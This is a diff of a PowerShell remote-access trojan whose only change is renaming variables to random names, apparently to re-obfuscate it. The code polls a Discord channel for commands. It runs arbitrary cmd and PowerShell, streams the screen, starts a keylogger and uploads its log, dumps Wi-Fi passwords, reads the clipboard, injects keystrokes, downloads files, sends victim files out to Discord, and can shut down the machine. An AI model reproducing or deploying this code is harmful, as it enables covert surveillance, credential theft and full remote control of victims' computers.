-                if ($BktMd) { $VvYns = ($BktMd.Trim() -split '\s+')[0].ToLower() }
+                $GuDcp = ""
+                if ($tNJR) { $GuDcp = ($tNJR.Trim() -split '\s+')[0].ToLower() }
 
-                if ($VvYns -eq "stop" -or $VvYns -eq "off") {
+                if ($GuDcp -eq "stop" -or $GuDcp -eq "off") {
                     Send-DiscordMessage -Content (Stop-CaptureStream) -ReplyToId $msgId
                     return
                 }
-                if ($VvYns -eq "status") {
-                    $ODAUqj = $null
-                    if ($script:capturePid) { $ODAUqj = Get-Process -Id $script:capturePid -EA SilentlyContinue }
-                    if (-not $ODAUqj -and (Test-Path -LiteralPath $script:capturePidFile)) {
-                        try { $oWO9Tf = [int](Get-Content -LiteralPath $script:capturePidFile -Raw); $ODAUqj = Get-Process -Id $oWO9Tf -EA SilentlyContinue } catch { }
+                if ($GuDcp -eq "status") {
+                    $IJXS = $null
+                    if ($script:capturePid) { $IJXS = Get-Process -Id $script:capturePid -EA SilentlyContinue }
+                    if (-not $IJXS -and (Test-Path -LiteralPath $script:capturePidFile)) {
+                        try { $beVwKCmL = [int](Get-Content -LiteralPath $script:capturePidFile -Raw); $IJXS = Get-Process -Id $beVwKCmL -EA SilentlyContinue } catch { }
                     }
-                    if ($ODAUqj) {
-                        $OjA2q = if ($script:captureStart) { [int]((Get-Date) - $script:captureStart).TotalSeconds } else { "?" }
-                        Send-DiscordMessage -Content "Running | PID $($ODAUqj.Id) | ${OjA2q}s elapsed" -ReplyToId $msgId
+                    if ($IJXS) {
+                        $okUx1l = if ($script:captureStart) { [int]((Get-Date) - $script:captureStart).TotalSeconds } else { "?" }
+                        Send-DiscordMessage -Content "Running | PID $($IJXS.Id) | ${okUx1l}s elapsed" -ReplyToId $msgId
                     } else {
                         Send-DiscordMessage -Content "Not running" -ReplyToId $msgId
                     }
                     return
                 }
-                if ($VvYns -eq "err" -or $VvYns -eq "log") {
+                if ($GuDcp -eq "err" -or $GuDcp -eq "log") {
                     if (-not (Test-Path -LiteralPath $script:captureErrFile)) {
                         Send-DiscordMessage -Content "No err log" -ReplyToId $msgId
                         return
                     }
-                    $nVc3 = Get-Content -LiteralPath $script:captureErrFile -Tail 50 -Encoding UTF8
-                    Send-CodeBlock -Title "capture err log" -Body ($nVc3 -join "`n") -ReplyToId $msgId
+                    $tYdaJug = Get-Content -LiteralPath $script:captureErrFile -Tail 50 -Encoding UTF8
+                    Send-CodeBlock -Title "capture err log" -Body ($tYdaJug -join "`n") -ReplyToId $msgId
                     return
                 }
-                if ($VvYns -eq "list") {
+                if ($GuDcp -eq "list") {
                     Add-Type -AssemblyName System.Windows.Forms
-                    $YtRs2 = [System.Windows.Forms.Screen]::AllScreens
-                    $GcHR6 = @("**0** = ALL (virtual screen)")
-                    for ($RaOc9j = 0; $RaOc9j -lt $YtRs2.Count; $RaOc9j++) {
-                        $bndCZBqZ = $YtRs2[$RaOc9j]
-                        $L3hThrW = if ($bndCZBqZ.Primary) { " [PRIMARY]" } else { "" }
-                        $GcHR6 += "**$($RaOc9j+1)** : $($bndCZBqZ.Bounds.Width)x$($bndCZBqZ.Bounds.Height) @ ($($bndCZBqZ.Bounds.X),$($bndCZBqZ.Bounds.Y))$L3hThrW"
+                    $n6fo9 = [System.Windows.Forms.Screen]::AllScreens
+                    $QdyYbI = @("**0** = ALL (virtual screen)")
+                    for ($hFUm = 0; $hFUm -lt $n6fo9.Count; $hFUm++) {
+                        $Qo7e = $n6fo9[$hFUm]
+                        $iCh5 = if ($Qo7e.Primary) { " [PRIMARY]" } else { "" }
+                        $QdyYbI += "**$($hFUm+1)** : $($Qo7e.Bounds.Width)x$($Qo7e.Bounds.Height) @ ($($Qo7e.Bounds.X),$($Qo7e.Bounds.Y))$iCh5"
                     }
-                    Send-CodeBlock -Title "Monitors" -Body ($GcHR6 -join "`n") -ReplyToId $msgId
+                    Send-CodeBlock -Title "Monitors" -Body ($QdyYbI -join "`n") -ReplyToId $msgId
                     return
                 }
-                $kgICGVXv = if ($BktMd) { $BktMd.Trim() -split '\s+' } else { @() }
-                $fps = 1; $RAxUHf = 60; $Ib7V = 0; $vjrq = 0
-                try { if ($kgICGVXv.Count -ge 1 -and $kgICGVXv[0]) { $fps = [int]$kgICGVXv[0] } } catch { }
-                try { if ($kgICGVXv.Count -ge 2 -and $kgICGVXv[1]) { $RAxUHf   = [int]$kgICGVXv[1] } } catch { }
-                try { if ($kgICGVXv.Count -ge 3 -and $kgICGVXv[2]) { $Ib7V = [int]$kgICGVXv[2] } } catch { }
-                try { if ($kgICGVXv.Count -ge 4 -and $kgICGVXv[3]) { $vjrq = [int]$kgICGVXv[3] } } catch { }
+                $dwTscdd = if ($tNJR) { $tNJR.Trim() -split '\s+' } else { @() }
+                $fps = 1; $jbItolN = 60; $SXZnW7MG = 0; $RWjv = 0
+                try { if ($dwTscdd.Count -ge 1 -and $dwTscdd[0]) { $fps = [int]$dwTscdd[0] } } catch { }
+                try { if ($dwTscdd.Count -ge 2 -and $dwTscdd[1]) { $jbItolN   = [int]$dwTscdd[1] } } catch { }
+                try { if ($dwTscdd.Count -ge 3 -and $dwTscdd[2]) { $SXZnW7MG = [int]$dwTscdd[2] } } catch { }
+                try { if ($dwTscdd.Count -ge 4 -and $dwTscdd[3]) { $RWjv = [int]$dwTscdd[3] } } catch { }
                 if ($fps -lt 1) { $fps = 1 }; if ($fps -gt 2) { $fps = 2 }
-                if ($RAxUHf -lt 20) { $RAxUHf = 20 }; if ($RAxUHf -gt 90) { $RAxUHf = 90 }
-                if ($Ib7V -lt 0) { $Ib7V = 0 }
-                if ($Ib7V -gt 0 -and $Ib7V -lt 5) { $Ib7V = 5 }
-                $qUNra = Start-CaptureStream -Fps $fps -Quality $RAxUHf -MaxSeconds $Ib7V -Monitor $vjrq
-                Send-DiscordMessage -Content "$qUNra`n``!capture stop`` | ``!capture status`` | ``!capture err`` | ``!capture list``" -ReplyToId $msgId
+                if ($jbItolN -lt 20) { $jbItolN = 20 }; if ($jbItolN -gt 90) { $jbItolN = 90 }
+                if ($SXZnW7MG -lt 0) { $SXZnW7MG = 0 }
+                if ($SXZnW7MG -gt 0 -and $SXZnW7MG -lt 5) { $SXZnW7MG = 5 }
+                $DUTw = Start-CaptureStream -Fps $fps -Quality $jbItolN -MaxSeconds $SXZnW7MG -Monitor $RWjv
+                Send-DiscordMessage -Content "$DUTw`n``!capture stop`` | ``!capture status`` | ``!capture err`` | ``!capture list``" -ReplyToId $msgId
                 return
             }
 
             "sendkey" {
-                if (-not $BktMd) { Send-DiscordMessage -Content "usage: !sendkey <text>" -ReplyToId $msgId; return }
-                $IvCZ79H = $BktMd
-                $fjeae = $IvCZ79H -replace "'", "''"
-                $bdUegpN = "`$w = New-Object -ComObject WScript.Shell; `$w.SendKeys('$fjeae')"
-                Invoke-PSCommand -Command $bdUegpN | Out-Null
-                Send-DiscordMessage -Content "Sent: ``$IvCZ79H``" -ReplyToId $msgId
+                if (-not $tNJR) { Send-DiscordMessage -Content "usage: !sendkey <text>" -ReplyToId $msgId; return }
+                $CZLkx = $tNJR
+                $ghXb = $CZLkx -replace "'", "''"
+                $EmBahW = "`$w = New-Object -ComObject WScript.Shell; `$w.SendKeys('$ghXb')"
+                Invoke-PSCommand -Command $EmBahW | Out-Null
+                Send-DiscordMessage -Content "Sent: ``$CZLkx``" -ReplyToId $msgId
                 return
             }
 
             "keylog" {
-                $VvYns = ""
-                if ($BktMd) { $VvYns = ($BktMd.Trim() -split '\s+')[0].ToLower() }
-                if ($VvYns -eq "clear") {
+                $GuDcp = ""
+                if ($tNJR) { $GuDcp = ($tNJR.Trim() -split '\s+')[0].ToLower() }
+                if ($GuDcp -eq "clear") {
                     Remove-Item -LiteralPath $script:keylogLogFile -Force -EA SilentlyContinue
                     Send-DiscordMessage -Content "Log cleared" -ReplyToId $msgId
                     return
                 }
-                $qUNra = Start-KeyLog
-                Send-DiscordMessage -Content "$qUNra`nDung: ``!keystop`` | Check: ``!keystat``" -ReplyToId $msgId
+                $DUTw = Start-KeyLog
+                Send-DiscordMessage -Content "$DUTw`nDung: ``!keystop`` | Check: ``!keystat``" -ReplyToId $msgId
                 return
             }
 
@@ -1086,16 +1053,16 @@ function Handle-Command {
                     Send-DiscordMessage -Content "Keylog not running" -ReplyToId $msgId
                     return
                 }
-                $KxbFqf = Stop-KeyLog
-                Send-DiscordMessage -Content $KxbFqf -ReplyToId $msgId
+                $fSOU = Stop-KeyLog
+                Send-DiscordMessage -Content $fSOU -ReplyToId $msgId
                 if (Test-Path -LiteralPath $script:keylogLogFile) {
-                    $Jw1md = (Get-Item $script:keylogLogFile).Length
-                    if ($Jw1md -gt 0) {
-                        if ($Jw1md -gt ($script:maxUploadMB * 1MB)) {
-                            $nVc3 = Get-Content $script:keylogLogFile -Tail 2000 -Encoding UTF8
-                            Send-CodeBlock -Title "keylog (tail)" -Body ($nVc3 -join "`n") -ReplyToId $msgId
+                    $YfED = (Get-Item $script:keylogLogFile).Length
+                    if ($YfED -gt 0) {
+                        if ($YfED -gt ($script:maxUploadMB * 1MB)) {
+                            $tYdaJug = Get-Content $script:keylogLogFile -Tail 2000 -Encoding UTF8
+                            Send-CodeBlock -Title "keylog (tail)" -Body ($tYdaJug -join "`n") -ReplyToId $msgId
                         } else {
-                            Send-DiscordFile -FilePath $script:keylogLogFile -Content "keylog ($Jw1md bytes)" -ReplyToId $msgId
+                            Send-DiscordFile -FilePath $script:keylogLogFile -Content "keylog ($YfED bytes)" -ReplyToId $msgId
                         }
                     } else {
                         Send-DiscordMessage -Content "Log empty" -ReplyToId $msgId
@@ -1107,76 +1074,76 @@ function Handle-Command {
             }
 
             "keystat" {
-                $ODAUqj = $null
-                if ($script:keylogPid) { $ODAUqj = Get-Process -Id $script:keylogPid -EA SilentlyContinue }
-                if (-not $ODAUqj -and (Test-Path -LiteralPath $script:keylogPidFile)) {
-                    try { $oWO9Tf = [int](Get-Content -LiteralPath $script:keylogPidFile -Raw); $ODAUqj = Get-Process -Id $oWO9Tf -EA SilentlyContinue } catch { }
+                $IJXS = $null
+                if ($script:keylogPid) { $IJXS = Get-Process -Id $script:keylogPid -EA SilentlyContinue }
+                if (-not $IJXS -and (Test-Path -LiteralPath $script:keylogPidFile)) {
+                    try { $beVwKCmL = [int](Get-Content -LiteralPath $script:keylogPidFile -Raw); $IJXS = Get-Process -Id $beVwKCmL -EA SilentlyContinue } catch { }
                 }
-                if ($ODAUqj) {
-                    $OjA2q = if ($script:keylogStart) { [int]((Get-Date) - $script:keylogStart).TotalSeconds } else { "?" }
-                    $Jw1md = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
-                    Send-DiscordMessage -Content "Running | PID $($ODAUqj.Id) | ${OjA2q}s | log $Jw1md bytes" -ReplyToId $msgId
+                if ($IJXS) {
+                    $okUx1l = if ($script:keylogStart) { [int]((Get-Date) - $script:keylogStart).TotalSeconds } else { "?" }
+                    $YfED = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
+                    Send-DiscordMessage -Content "Running | PID $($IJXS.Id) | ${okUx1l}s | log $YfED bytes" -ReplyToId $msgId
                 } else {
-                    $Jw1md = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
-                    Send-DiscordMessage -Content "Not running | log $Jw1md bytes" -ReplyToId $msgId
+                    $YfED = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
+                    Send-DiscordMessage -Content "Not running | log $YfED bytes" -ReplyToId $msgId
                 }
                 return
             }
 
-            "upload" { if (-not $BktMd) { return }; $ODAUqj = $BktMd.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($ODAUqj)) { $ODAUqj = Join-Path $script:workDir $ODAUqj }; Send-DiscordFile -FilePath $ODAUqj -Content "upload" -ReplyToId $msgId; return }
-            "send" { if (-not $BktMd) { return }; $ODAUqj = $BktMd.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($ODAUqj)) { $ODAUqj = Join-Path $script:workDir $ODAUqj }; Send-DiscordFile -FilePath $ODAUqj -Content "send" -ReplyToId $msgId; return }
-            "getfile" { if (-not $BktMd) { return }; $ODAUqj = $BktMd.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($ODAUqj)) { $ODAUqj = Join-Path $script:workDir $ODAUqj }; Send-DiscordFile -FilePath $ODAUqj -Content "getfile" -ReplyToId $msgId; return }
+            "upload" { if (-not $tNJR) { return }; $IJXS = $tNJR.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($IJXS)) { $IJXS = Join-Path $script:workDir $IJXS }; Send-DiscordFile -FilePath $IJXS -Content "upload" -ReplyToId $msgId; return }
+            "send" { if (-not $tNJR) { return }; $IJXS = $tNJR.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($IJXS)) { $IJXS = Join-Path $script:workDir $IJXS }; Send-DiscordFile -FilePath $IJXS -Content "send" -ReplyToId $msgId; return }
+            "getfile" { if (-not $tNJR) { return }; $IJXS = $tNJR.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($IJXS)) { $IJXS = Join-Path $script:workDir $IJXS }; Send-DiscordFile -FilePath $IJXS -Content "getfile" -ReplyToId $msgId; return }
             "download" {
-                if (-not $BktMd) { return }
-                $kgICGVXv = $BktMd.Trim() -split '\s+', 2
-                $RG6Zka = $kgICGVXv[0]
-                try { $dfaOgfK = [uri]$RG6Zka } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
-                $iTRaf = if ($kgICGVXv.Count -gt 1) { $kgICGVXv[1].Trim().Trim('"') } else { $XfeP = [System.IO.Path]::GetFileName($dfaOgfK.LocalPath); if (-not $XfeP) { $XfeP = "dl_$(Get-Date -Format 'HHmmss')" }; $XfeP }
-                if (-not [System.IO.Path]::IsPathRooted($iTRaf)) { $iTRaf = Join-Path $script:workDir $iTRaf }
-                try { Invoke-WebRequest -Uri $RG6Zka -OutFile $iTRaf -UseBasicParsing; Send-DiscordMessage -Content "``$iTRaf``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
+                if (-not $tNJR) { return }
+                $dwTscdd = $tNJR.Trim() -split '\s+', 2
+                $qvfoC2s = $dwTscdd[0]
+                try { $CheyiHQ = [uri]$qvfoC2s } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
+                $ezduHe = if ($dwTscdd.Count -gt 1) { $dwTscdd[1].Trim().Trim('"') } else { $DpOtxiEJ = [System.IO.Path]::GetFileName($CheyiHQ.LocalPath); if (-not $DpOtxiEJ) { $DpOtxiEJ = "dl_$(Get-Date -Format 'HHmmss')" }; $DpOtxiEJ }
+                if (-not [System.IO.Path]::IsPathRooted($ezduHe)) { $ezduHe = Join-Path $script:workDir $ezduHe }
+                try { Invoke-WebRequest -Uri $qvfoC2s -OutFile $ezduHe -UseBasicParsing; Send-DiscordMessage -Content "``$ezduHe``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                 return
             }
             "dl" {
-                if (-not $BktMd) { return }
-                $RG6Zka = ($BktMd.Trim() -split '\s+')[0]
-                try { $dfaOgfK = [uri]$RG6Zka } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
-                $XfeP = [System.IO.Path]::GetFileName($dfaOgfK.LocalPath); if (-not $XfeP) { $XfeP = "dl_$(Get-Date -Format 'HHmmss')" }
-                $iTRaf = Join-Path $script:workDir $XfeP
-                try { Invoke-WebRequest -Uri $RG6Zka -OutFile $iTRaf -UseBasicParsing; Send-DiscordMessage -Content "``$iTRaf``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
+                if (-not $tNJR) { return }
+                $qvfoC2s = ($tNJR.Trim() -split '\s+')[0]
+                try { $CheyiHQ = [uri]$qvfoC2s } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
+                $DpOtxiEJ = [System.IO.Path]::GetFileName($CheyiHQ.LocalPath); if (-not $DpOtxiEJ) { $DpOtxiEJ = "dl_$(Get-Date -Format 'HHmmss')" }
+                $ezduHe = Join-Path $script:workDir $DpOtxiEJ
+                try { Invoke-WebRequest -Uri $qvfoC2s -OutFile $ezduHe -UseBasicParsing; Send-DiscordMessage -Content "``$ezduHe``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                 return
             }
-            "cmd"    { if (-not $BktMd) { return }; $qUNra = Invoke-CmdCommand -Command $BktMd; Send-CodeBlock -Title "cmd" -Body $qUNra -ReplyToId $msgId; return }
-            "ps_cmd" { if (-not $BktMd) { return }; $qUNra = Invoke-PSCommand -Command $BktMd; Send-CodeBlock -Title "ps" -Body $qUNra -ReplyToId $msgId; return }
-            "run"    { if (-not $BktMd) { return }; $qUNra = Invoke-CmdCommand -Command $BktMd; Send-CodeBlock -Title "run" -Body $qUNra -ReplyToId $msgId; return }
-            "ps"     { $qUNra = Invoke-PSCommand -Command 'Get-Process|Sort-Object CPU -Descending|Select-Object -First 30 Name,Id,CPU,WS|Format-Table -AutoSize'; Send-CodeBlock -Title "proc" -Body $qUNra -ReplyToId $msgId; return }
-            "sysinfo"{ $qUNra = Invoke-PSCommand -Command 'Get-CimInstance Win32_OperatingSystem|Select-Object Caption,Version,LastBootUpTime|Format-List'; Send-CodeBlock -Title "sysinfo" -Body $qUNra -ReplyToId $msgId; return }
-            "cpu"    { $qUNra = Invoke-PSCommand -Command 'Get-CimInstance Win32_Processor|Format-List Name,NumberOfCores,NumberOfLogicalProcessors'; Send-CodeBlock -Title "cpu" -Body $qUNra -ReplyToId $msgId; return }
-            "ram"    { $qUNra = Invoke-PSCommand -Command '$o=Get-CimInstance Win32_OperatingSystem;"Total: {0:N2} GB / Free: {1:N2} GB" -f ($o.TotalVisibleMemorySize/1MB),($o.FreePhysicalMemory/1MB)'; Send-CodeBlock -Title "ram" -Body $qUNra -ReplyToId $msgId; return }
-            "disk"   { $qUNra = Invoke-PSCommand -Command 'Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"|ForEach-Object{"{0}: {1:N1} GB free / {2:N1} GB" -f $_.DeviceID,($_.FreeSpace/1GB),($_.Size/1GB)}'; Send-CodeBlock -Title "disk" -Body $qUNra -ReplyToId $msgId; return }
-            "ipconfig" { $qUNra = Invoke-CmdCommand -Command "ipconfig /all"; Send-CodeBlock -Title "ipconfig" -Body $qUNra -ReplyToId $msgId; return }
-            "netstat"  { $qUNra = Invoke-CmdCommand -Command "netstat -ano"; Send-CodeBlock -Title "netstat" -Body $qUNra -ReplyToId $msgId; return }
-            "wifipass" { $qUNra = Get-WifiPasswords; Send-CodeBlock -Title "wifi pass" -Body $qUNra -ReplyToId $msgId; return }
+            "cmd"    { if (-not $tNJR) { return }; $DUTw = Invoke-CmdCommand -Command $tNJR; Send-CodeBlock -Title "cmd" -Body $DUTw -ReplyToId $msgId; return }
+            "ps_cmd" { if (-not $tNJR) { return }; $DUTw = Invoke-PSCommand -Command $tNJR; Send-CodeBlock -Title "ps" -Body $DUTw -ReplyToId $msgId; return }
+            "run"    { if (-not $tNJR) { return }; $DUTw = Invoke-CmdCommand -Command $tNJR; Send-CodeBlock -Title "run" -Body $DUTw -ReplyToId $msgId; return }
+            "ps"     { $DUTw = Invoke-PSCommand -Command 'Get-Process|Sort-Object CPU -Descending|Select-Object -First 30 Name,Id,CPU,WS|Format-Table -AutoSize'; Send-CodeBlock -Title "proc" -Body $DUTw -ReplyToId $msgId; return }
+            "sysinfo"{ $DUTw = Invoke-PSCommand -Command 'Get-CimInstance Win32_OperatingSystem|Select-Object Caption,Version,LastBootUpTime|Format-List'; Send-CodeBlock -Title "sysinfo" -Body $DUTw -ReplyToId $msgId; return }
+            "cpu"    { $DUTw = Invoke-PSCommand -Command 'Get-CimInstance Win32_Processor|Format-List Name,NumberOfCores,NumberOfLogicalProcessors'; Send-CodeBlock -Title "cpu" -Body $DUTw -ReplyToId $msgId; return }
+            "ram"    { $DUTw = Invoke-PSCommand -Command '$o=Get-CimInstance Win32_OperatingSystem;"Total: {0:N2} GB / Free: {1:N2} GB" -f ($o.TotalVisibleMemorySize/1MB),($o.FreePhysicalMemory/1MB)'; Send-CodeBlock -Title "ram" -Body $DUTw -ReplyToId $msgId; return }
+            "disk"   { $DUTw = Invoke-PSCommand -Command 'Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"|ForEach-Object{"{0}: {1:N1} GB free / {2:N1} GB" -f $_.DeviceID,($_.FreeSpace/1GB),($_.Size/1GB)}'; Send-CodeBlock -Title "disk" -Body $DUTw -ReplyToId $msgId; return }
+            "ipconfig" { $DUTw = Invoke-CmdCommand -Command "ipconfig /all"; Send-CodeBlock -Title "ipconfig" -Body $DUTw -ReplyToId $msgId; return }
+            "netstat"  { $DUTw = Invoke-CmdCommand -Command "netstat -ano"; Send-CodeBlock -Title "netstat" -Body $DUTw -ReplyToId $msgId; return }
+            "wifipass" { $DUTw = Get-WifiPasswords; Send-CodeBlock -Title "wifi pass" -Body $DUTw -ReplyToId $msgId; return }
             "admin"  { Send-DiscordMessage -Content "admin: $(if(Test-Admin){'yes'}else{'no'})" -ReplyToId $msgId; return }
-            "keys"   { if (-not $BktMd) { return }; $ZOfmyDS = $BktMd -replace "'","''"; Invoke-PSCommand -Command "`$w=New-Object -ComObject WScript.Shell;`$w.SendKeys('$ZOfmyDS')" | Out-Null; Send-DiscordMessage -Content "keys sent" -ReplyToId $msgId; return }
-            "clipboard_get" { $qUNra = Invoke-PSCommand -Command "Get-Clipboard"; Send-CodeBlock -Title "clip" -Body $qUNra -ReplyToId $msgId; return }
-            "clipboard_set" { if (-not $BktMd) { return }; Invoke-PSCommand -Command "Set-Clipboard '$BktMd'" | Out-Null; Send-DiscordMessage -Content "ok" -ReplyToId $msgId; return }
+            "keys"   { if (-not $tNJR) { return }; $BE3q = $tNJR -replace "'","''"; Invoke-PSCommand -Command "`$w=New-Object -ComObject WScript.Shell;`$w.SendKeys('$BE3q')" | Out-Null; Send-DiscordMessage -Content "keys sent" -ReplyToId $msgId; return }
+            "clipboard_get" { $DUTw = Invoke-PSCommand -Command "Get-Clipboard"; Send-CodeBlock -Title "clip" -Body $DUTw -ReplyToId $msgId; return }
+            "clipboard_set" { if (-not $tNJR) { return }; Invoke-PSCommand -Command "Set-Clipboard '$tNJR'" | Out-Null; Send-DiscordMessage -Content "ok" -ReplyToId $msgId; return }
             "lock"   { Invoke-CmdCommand -Command "rundll32.exe user32.dll,LockWorkStation" | Out-Null; Send-DiscordMessage -Content "locked" -ReplyToId $msgId; return }
             "shutdown_sys" { Invoke-CmdCommand -Command "shutdown /s /t 5" | Out-Null; Send-DiscordMessage -Content "off 5s" -ReplyToId $msgId; return }
             "restart_sys"  { Invoke-CmdCommand -Command "shutdown /r /t 5" | Out-Null; Send-DiscordMessage -Content "restart 5s" -ReplyToId $msgId; return }
-            "msg"    { if (-not $BktMd) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('$BktMd','Msg')" | Out-Null; Send-DiscordMessage -Content "msg" -ReplyToId $msgId; return }
-            "speak"  { if (-not $BktMd) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName System.Speech;`$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;`$s.Speak('$BktMd')" | Out-Null; Send-DiscordMessage -Content "speak" -ReplyToId $msgId; return }
+            "msg"    { if (-not $tNJR) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('$tNJR','Msg')" | Out-Null; Send-DiscordMessage -Content "msg" -ReplyToId $msgId; return }
+            "speak"  { if (-not $tNJR) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName System.Speech;`$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;`$s.Speak('$tNJR')" | Out-Null; Send-DiscordMessage -Content "speak" -ReplyToId $msgId; return }
             "beep"   { Invoke-PSCommand -Command '[console]::beep(1000,500)' | Out-Null; Send-DiscordMessage -Content "beep" -ReplyToId $msgId; return }
 
             default {
-                if (-not $bdUegpN -and $eITC67) {
-                    $AD04G = Download-DiscordAttachment -Message $Message
-                    if ($AD04G.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($AD04G | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
+                if (-not $EmBahW -and $EFjZVu) {
+                    $Xtpbfge = Download-DiscordAttachment -Message $Message
+                    if ($Xtpbfge.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($Xtpbfge | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
                     return
                 }
-                $CzbEC5C = Test-Dangerous -Command $bdUegpN
-                if ($CzbEC5C) { Send-DiscordMessage -Content "REFUSED: $CzbEC5C" -ReplyToId $msgId; return }
-                $qUNra = Invoke-CmdCommand -Command $bdUegpN
-                Send-CodeBlock -Title "$($script:pcName)> $bdUegpN" -Body $qUNra -ReplyToId $msgId
+                $uNbIUhs = Test-Dangerous -Command $EmBahW
+                if ($uNbIUhs) { Send-DiscordMessage -Content "REFUSED: $uNbIUhs" -ReplyToId $msgId; return }
+                $DUTw = Invoke-CmdCommand -Command $EmBahW
+                Send-CodeBlock -Title "$($script:pcName)> $EmBahW" -Body $DUTw -ReplyToId $msgId
                 return
             }
         }
@@ -1214,15 +1181,15 @@ if (-not $script:isActive) {
 LogA "ACTIVE MODE" "Green"
 
 try {
-    $vrCTZhd = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $bqueD -Method Get
-    LogA "Bot: $($vrCTZhd.username)" "Green"
+    $lZB5H = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $xhD6grE -Method Get
+    LogA "Bot: $($lZB5H.username)" "Green"
 } catch { LogA "API fail: $_" "Red"; Release-Lock; exit 1 }
 
 try {
-    $AH9helmm = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" -Headers $bqueD
-    if ($AH9helmm) {
-        $PAbEkp = if ($AH9helmm -is [array]) { $AH9helmm[0] } else { $AH9helmm }
-        if ($PAbEkp -and $PAbEkp.id) { $script:lastMessageId = [string]$PAbEkp.id }
+    $ockM5D = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" -Headers $xhD6grE
+    if ($ockM5D) {
+        $e6Ie = if ($ockM5D -is [array]) { $ockM5D[0] } else { $ockM5D }
+        if ($e6Ie -and $e6Ie.id) { $script:lastMessageId = [string]$e6Ie.id }
     }
 } catch { }
 
@@ -1232,27 +1199,27 @@ try {
     while ($script:running) {
         try {
             if (-not $script:isActive) { break }
-            $n3f1 = New-Object System.Collections.ArrayList
-            $Q5AV4 = $script:lastMessageId
-            $QSCf = [string]::IsNullOrEmpty($Q5AV4)
+            $l42BCaQ = New-Object System.Collections.ArrayList
+            $O4fgXV = $script:lastMessageId
+            $miON = [string]::IsNullOrEmpty($O4fgXV)
             do {
-                if ($QSCf) { $RG6Zka = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" }
-                else { $RG6Zka = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=50&after=$Q5AV4" }
-                $EMaEZ = Invoke-RestMethod -Uri $RG6Zka -Headers $bqueD -Method Get
-                if (-not $EMaEZ) { break }
-                if ($EMaEZ -isnot [array]) { $EMaEZ = @($EMaEZ) }
-                $EMaEZ = @($EMaEZ | Sort-Object { [long]$_.id })
-                foreach ($EFfic in $EMaEZ) { [void]$n3f1.Add($EFfic); $Q5AV4 = $EFfic.id }
-                if ($QSCf) { break }
-            } while ($EMaEZ.Count -eq 50)
+                if ($miON) { $qvfoC2s = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" }
+                else { $qvfoC2s = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=50&after=$O4fgXV" }
+                $qjHgin = Invoke-RestMethod -Uri $qvfoC2s -Headers $xhD6grE -Method Get
+                if (-not $qjHgin) { break }
+                if ($qjHgin -isnot [array]) { $qjHgin = @($qjHgin) }
+                $qjHgin = @($qjHgin | Sort-Object { [long]$_.id })
+                foreach ($vLUcR in $qjHgin) { [void]$l42BCaQ.Add($vLUcR); $O4fgXV = $vLUcR.id }
+                if ($miON) { break }
+            } while ($qjHgin.Count -eq 50)
 
-            if ($QSCf) {
-                if ($n3f1.Count -gt 0) { $script:lastMessageId = [string]$n3f1[$n3f1.Count - 1].id }
+            if ($miON) {
+                if ($l42BCaQ.Count -gt 0) { $script:lastMessageId = [string]$l42BCaQ[$l42BCaQ.Count - 1].id }
             } else {
-                foreach ($EFfic in $n3f1) {
-                    if (-not $script:lastMessageId -or [long]$EFfic.id -gt [long]$script:lastMessageId) { $script:lastMessageId = $EFfic.id }
-                    if ($EFfic.author.id -eq $script:botUserId) { continue }
-                    Handle-Command -Message $EFfic
+                foreach ($vLUcR in $l42BCaQ) {
+                    if (-not $script:lastMessageId -or [long]$vLUcR.id -gt [long]$script:lastMessageId) { $script:lastMessageId = $vLUcR.id }
+                    if ($vLUcR.author.id -eq $script:botUserId) { continue }
+                    Handle-Command -Message $vLUcR
                 }
             }
             if (((Get-Date) - $script:lastBeat).TotalSeconds -ge $script:heartbeatSec) { Send-Heartbeat }
